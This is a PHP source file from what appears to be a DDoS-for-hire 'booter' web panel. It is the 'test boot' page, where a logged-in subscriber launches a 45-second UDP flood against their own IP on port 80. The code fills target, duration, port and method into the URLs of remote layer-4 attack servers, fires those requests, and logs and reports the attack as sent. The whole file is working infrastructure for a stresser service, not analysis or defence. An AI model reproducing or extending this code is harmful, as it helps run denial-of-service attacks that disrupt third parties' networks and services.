<?php
ob_start();
require_once 'includes/db.php';
require_once 'includes/init.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
$plansql = $odb -> prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`,`plans`.`max_boots` AS `pboots` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
$plansql -> execute(array(":id" => $_SESSION['ID']));
$userInfo = $plansql -> fetch(PDO::FETCH_ASSOC);

$currentPage = "testBoot";

$testResult = "";

if (isset($_POST['testBoot'], $_POST['ip'])) {
	if (!empty($_POST['ip']) && $_POST['ip'] == $_SERVER['REMOTE_ADDR']) {
		if ( isset($userInfo['test_boot']) && time()-$userInfo['test_boot'] < (60*15)) {
			$testResult = "<div class='alert alert-error'>You can only send a test boot every 15 minutes</div>";
		} else {
			$servers = array();
			$name = "*";
			
			if ($useRotations) {
				$getServers = $odb->query("SELECT * FROM `servers_layer4` WHERE `active`='1' ORDER BY ABS(`last_used`) ASC LIMIT 1;");
				if ($getServers->rowCount() != 0) {
					$servers = $getServers->fetchAll(PDO::FETCH_ASSOC);
					$name = $servers[0]['name'];
				}
			} else {
				$getServers = $odb->query("SELECT * FROM `servers_layer4` WHERE `active`='1' ORDER BY ABS(`last_used`) ASC;");
				if ($getServers->rowCount() != 0) $servers = $getServers->fetchAll(PDO::FETCH_ASSOC);										
			}
			
			if (!empty($servers)) {
				$addr = "";
				
				foreach ($servers as $k => $server)
				{
					$addr = str_replace("%host%", $_SERVER['REMOTE_ADDR'], $server['addr'] . $server['resource']);
					$addr = str_replace("%time%", 45, $addr);
					$addr = str_replace("%port%", 80, $addr);
					$addr = str_replace("%method%", "udp", $addr);
					
					@file_get_contents($addr);
					
					$addr = null;
					$updateServer = $odb->prepare("UPDATE `servers_layer4` SET `last_used` = UNIX_TIMESTAMP(NOW()) WHERE `id`=:id");
					$updateServer->execute(array(":id" => $server['id']));
				}
				
				$updateUser = $odb->prepare("UPDATE `users` SET `test_boot`=UNIX_TIMESTAMP(NOW()) WHERE `id`=:id");
				$updateUser->execute(array(":id" => $_SESSION['ID']));
				
				$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), NULL, :stopped, :server)");
				$insertLogSQL -> execute(array(
					':user' => $_SESSION['username'],
					':ip' => $_SERVER['REMOTE_ADDR'],
					':port' => "80",
					':time' => 45,
					':method' => "udp",
					':stopped' => "No",
					":server" => $name
				));
				
				$testResult = "<div class=\"g_12\"><div class=\"alert alert-success\">SUCCESS: Attack has been sent to " . $_SERVER['REMOTE_ADDR'].":80 for 45 seconds.</div></div>";
			} else {
				$testResult = "<div class='alert alert-danger'>There are currently no servers available! Please try again in a few minutes.</div>";
			}
		}
	} else {
		// Invalid IP, ban hammer them!
	}
} else {
	$testResult = "<div class='alert alert-error'>Invalid test boot request</div>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title><?php echo $bootername; ?>Dashboard</title>
	
	<link rel="icon" sizes="192x192" href="img/touch-icon.png" /> 
	<link rel="apple-touch-icon" href="img/touch-icon-iphone.png" /> 
	<link rel="apple-touch-icon" sizes="76x76" href="img/touch-icon-ipad.png" /> 
	<link rel="apple-touch-icon" sizes="120x120" href="img/touch-icon-iphone-retina.png" />
	<link rel="apple-touch-icon" sizes="152x152" href="img/touch-icon-ipad-retina.png" />
	
	<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico" />

	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="css/main.min.css">
</head>
<body>

	<header class="top-bar">
			<?php include "includes/template/header.php"; ?>
			
	</header> <!-- /top-bar -->


	<div class="wrapper">

		<aside class="sidebar">
<?php include "includes/template/sidebar.php"; ?>
		</aside> <!-- /sidebar -->
		
		<section class="content">
<?php
	echo (isset($testResult) ? $testResult : "");
?>

				</div> <!-- /row -->


			

		</section> <!-- /content -->

	</div>


	 
	<script type="text/javascript" src="js/main.js"></script>
	<script type="text/javascript" src="js/amcharts/amcharts.js"></script>
	<script type="text/javascript" src="js/amcharts/serial.js"></script>
	<script type="text/javascript" src="js/amcharts/pie.js"></script>
	<script type="text/javascript" src="js/chart.js"></script>
</body>
</html>